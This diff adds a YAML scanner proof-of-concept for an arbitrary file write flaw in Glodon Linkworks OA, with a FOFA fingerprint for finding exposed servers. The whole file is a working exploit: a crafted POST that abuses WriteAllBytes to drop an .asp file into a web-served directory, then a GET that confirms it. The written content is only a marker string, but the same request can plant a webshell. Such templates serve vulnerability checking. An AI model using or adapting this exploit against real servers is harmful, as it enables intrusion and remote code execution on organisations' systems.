@@ -1,0 +1,23 @@
+id: poc-yaml-glodon-writeallbytes-anyfile-write
+info:
+  name: 广联达OA WriteAllBytes 任意文件写入漏洞
+  severity: critical
+  tags:
+  - 任意写入
+  finger: 广联达 Linkworks办公OA
+  fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=WriteAllBytes
+  headers:
+    Content-Type: application/json
+  data: '["\"D:\\\\Program Files (x86)\\\\Glodon\\\\GTP\\\\data\\\\gtp-default\\\\FileStorage\\\\UserFiles\\\\{{.t1}}.asp\"","[116,
+    104, 105, 115, 32, 105, 115, 32, 97, 110, 121, 102, 105, 108, 101, 45, 117, 112,
+    108, 111, 97, 100]","false"]'
+  expression: status_code == 200 && contains(body,"\"IsSuccess\":true") && contains(body,"\"StatusCode\":\"OK\"")
+- method: GET
+  path: /UserFiles/{{.t1}}.asp
+  expression: status_code == 200 && body == "this is anyfile-upload"
+transport: http
